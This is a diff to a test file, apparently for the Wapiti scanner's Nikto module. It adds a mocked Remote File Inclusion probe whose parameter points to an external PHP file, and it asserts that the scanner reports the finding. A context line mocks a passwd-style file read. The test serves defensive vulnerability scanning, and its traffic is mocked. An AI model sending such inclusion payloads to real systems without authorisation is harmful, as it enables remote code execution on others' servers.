@@ -22,6 +22,10 @@ async def test_whole_stuff():
         return_value=httpx.Response(200, text="root:0:0:")
     )
 
+    respx.get("http://perdu.com/phphd_downloads/common.php?phphd_real_path=http://wapiti3.ovh/e.php").mock(
+        return_value=httpx.Response(200, text="aa9d05b9ab864e169d723e9668d3dc77")
+    )
+
     respx.route(host="perdu.com").mock(
         return_value=httpx.Response(404, text="Not found")
     )
@@ -43,7 +47,7 @@ async def test_whole_stuff():
         module.do_get = True
         await module.attack(request)
 
-        assert persister.add_payload.call_count == 1
+        assert persister.add_payload.call_count == 2
         assert persister.add_payload.call_args_list[0][1]["module"] == "nikto"
         assert persister.add_payload.call_args_list[0][1]["category"] == "Potentially dangerous file"
         assert persister.add_payload.call_args_list[0][1]["request"].url == (
@@ -53,6 +57,10 @@ async def test_whole_stuff():
                    "This CGI allows attackers read arbitrary files on the host"
                ) in persister.add_payload.call_args_list[0][1]["info"]
 
+        assert persister.add_payload.call_args_list[1][1]["request"].url == (
+            "http://perdu.com/phphd_downloads/common.php?phphd_real_path=http%3A%2F%2Fwapiti3.ovh%2Fe.php"
+        )
+        assert "Remote File Inclusion (RFI)" in persister.add_payload.call_args_list[1][1]["info"]
 
 @pytest.mark.asyncio
 @respx.mock
